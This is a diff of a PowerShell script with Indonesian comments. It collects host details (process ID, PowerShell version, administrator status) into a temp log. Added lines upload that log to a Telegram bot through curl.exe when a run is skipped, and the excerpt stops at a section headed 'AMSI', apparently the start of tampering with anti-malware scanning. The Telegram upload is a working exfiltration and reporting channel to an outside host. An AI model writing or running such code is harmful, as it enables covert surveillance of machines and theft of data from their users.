@@ -19,13 +19,20 @@ $log  = Join-Path $env:TEMP 'st.txt'
 $mark = Join-Path $env:TEMP 'st.marker'
 function T($s) { "$((Get-Date -f HH:mm:ss))  $s" | Out-File -FilePath $log -Append -Encoding utf8 }
 
-# penjaga: jangan eksekusi ulang dalam 5 menit
-if ((Test-Path $mark) -and ((Get-Date) - (Get-Item $mark).LastWriteTime).TotalMinutes -lt 5) { exit }
-New-Item $mark -ItemType File -Force | Out-Null
 Remove-Item $log -Force -ErrorAction SilentlyContinue
-
-T "start pid=$PID ps=$($PSVersionTable.PSVersion) x86=$([Environment]::Is64BitProcess)"
+T "mulai pid=$PID ps=$($PSVersionTable.PSVersion) x86=$([Environment]::Is64BitProcess)"
 T "admin=$(([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole('Administrators'))"
+
+# penjaga: jangan eksekusi ulang dalam 5 menit.
+# Kalau dilewati, kirim keterangannya ke Telegram supaya tidak terlihat "gagal".
+if ((Test-Path $mark) -and ((Get-Date) - (Get-Item $mark).LastWriteTime).TotalMinutes -lt 5) {
+    T 'skip: sudah jalan kurang dari 5 menit'
+    if ($bot -and $chat) {
+        curl.exe -s -F "chat_id=$chat" -F "document=@$log" -F "caption=SKIP" "https://api.telegram.org/bot$bot/sendDocument" > $null
+    }
+    exit
+}
+New-Item $mark -ItemType File -Force | Out-Null
 
 # ---------- 0. AMSI ------------------------------------------------------
 try {
